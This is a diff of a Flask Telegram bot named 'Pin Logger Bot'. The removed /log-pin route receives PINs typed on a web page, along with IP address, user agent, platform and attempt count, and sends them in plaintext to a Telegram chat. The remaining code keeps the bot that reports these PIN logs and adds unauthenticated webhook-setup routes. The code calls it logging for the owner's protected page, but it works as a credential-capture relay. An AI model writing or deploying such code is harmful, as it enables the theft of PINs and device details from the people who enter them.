@@ -7,125 +7,65 @@ app = Flask(__name__)
 
 BOT_TOKEN = os.environ.get('BOT_TOKEN')
 CHAT_ID = os.environ.get('CHAT_ID')
-WEBHOOK_SECRET = os.environ.get('WEBHOOK_SECRET', 'mysecret123')  # для небольшой защиты
 
-if not BOT_TOKEN or not CHAT_ID:
-    print("⚠️ Внимание: BOT_TOKEN или CHAT_ID не установлены в переменных окружения!")
-
-# ==================== ЛОГИРОВАНИЕ PIN ====================
-@app.route('/log-pin', methods=['POST'])
-def log_pin():
-    try:
-        data = request.get_json() or {}
-
-        timestamp = data.get('timestamp', datetime.utcnow().isoformat() + 'Z')
-        entered_pin = data.get('entered_pin', '—')
-        success = data.get('success', False)
-        ip = data.get('ip', 'неизвестно')
-        user_agent = data.get('user_agent', '—')[:200]
-        platform = data.get('platform', '—')
-        language = data.get('language', '—')
-        attempts = data.get('attempts', 0)
-
-        status = "✅ Успешный вход" if success else "❌ Неверный PIN"
-
-        message = f"""🔒 <b>Попытка ввода PIN</b>
-
-🕒 {timestamp}
-{status}
-🔑 Введённый PIN: <code>{entered_pin}</code>
-🔢 Попытка № {attempts}
-
-🌐 IP: <code>{ip}</code>
-📱 User-Agent: <code>{user_agent}</code>
-🖥 Платформа: {platform} | Язык: {language}"""
-
-        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-        payload = {
-            "chat_id": CHAT_ID,
-            "text": message,
-            "parse_mode": "HTML",
-            "disable_web_page_preview": True
-        }
-
-        r = requests.post(url, json=payload, timeout=10)
-        if r.status_code != 200:
-            print("Telegram send error:", r.text)
-
-        return jsonify({"status": "ok"})
-    except Exception as e:
-        print("Ошибка в /log-pin:", str(e))
-        return jsonify({"status": "error"}), 500
-
-
-# ==================== ОБРАБОТКА КОМАНД TELEGRAM (/start и др.) ====================
 @app.route('/webhook', methods=['POST'])
 def webhook():
     try:
-        update = request.get_json()
-
+        update = request.get_json(silent=True)
         if not update or 'message' not in update:
-            return jsonify({"status": "ignored"})
+            return jsonify({"ok": True}), 200   # важно возвращать 200 OK
 
         message = update['message']
         chat_id = message['chat']['id']
-        text = message.get('text', '')
+        text = message.get('text', '').strip()
 
         if text == '/start':
-            response_text = f"""👋 <b>Пин-логгер бот запущен и работает!</b>
+            response = f"""👋 Бот работает!
 
-✅ Бот онлайн
-🔐 Готов принимать логи с HTML-страницы
-📍 Логи приходят в этот чат
+✅ Webhook активен
+🕒 {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')}
+📍 Логи PIN приходят в этот чат
 
-ID чата: <code>{chat_id}</code>
-Время запуска: {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')}
-
-Просто напишите /help для справки."""
-
+Напиши /help"""
         elif text == '/help':
-            response_text = """📋 Доступные команды:
-
-/start — проверить, работает ли бот
-/help — показать это сообщение
-/status — информация о боте
-
-Бот автоматически отправляет сюда все попытки ввода PIN с вашей защищённой страницы."""
-
-        elif text == '/status':
-            response_text = f"""📊 Статус бота:
-
-🟢 Работает
-⏰ Текущее время: {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')}
-📍 Логи отправляются в чат: {CHAT_ID}
-🔗 Webhook активен"""
-
+            response = "Команды: /start, /help, /status"
         else:
-            response_text = "Неизвестная команда. Напишите /help"
+            response = "Неизвестная команда. Напиши /help"
 
-        # Отправляем ответ
-        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-        payload = {
-            "chat_id": chat_id,
-            "text": response_text,
-            "parse_mode": "HTML"
-        }
-        requests.post(url, json=payload, timeout=8)
-
-        return jsonify({"status": "ok"})
+        requests.post(
+            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
+            json={"chat_id": chat_id, "text": response, "parse_mode": "HTML"},
+            timeout=10
+        )
+        return jsonify({"ok": True}), 200
     except Exception as e:
-        print("Ошибка в webhook:", str(e))
-        return jsonify({"status": "error"}), 500
+        print("Webhook error:", e)
+        return jsonify({"ok": True}), 200   # всегда 200, чтобы Telegram не ругался
 
+@app.route('/setwebhook')
+def set_webhook():
+    if not BOT_TOKEN:
+        return "<h1>BOT_TOKEN не найден в переменных окружения!</h1>"
+    
+    webhook_url = request.host_url.rstrip('/') + "/webhook"
+    r = requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/setWebhook?url={webhook_url}&drop_pending_updates=true")
+    return f"""
+    <h2>Webhook установлен</h2>
+    <p>URL: <code>{webhook_url}</code></p>
+    <pre>{r.text}</pre>
+    <br><a href="/getwebhookinfo">Проверить статус webhook</a>
+    """
 
-# Простая страница для проверки, что сервер живой
+@app.route('/getwebhookinfo')
+def get_webhook_info():
+    if not BOT_TOKEN:
+        return "BOT_TOKEN не найден"
+    r = requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/getWebhookInfo")
+    return f"<pre>{r.text}</pre>"
+
 @app.route('/')
 def home():
-    return f"""
-    <h1>Pin Logger Bot is running</h1>
-    <p>Время: {datetime.utcnow()}</p>
-    <p>Бот готов принимать логи по /log-pin</p>
-    """
+    return "<h1>Pin Logger Bot запущен</h1><p><a href='/setwebhook'>Установить webhook</a></p>"
 
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 5000))
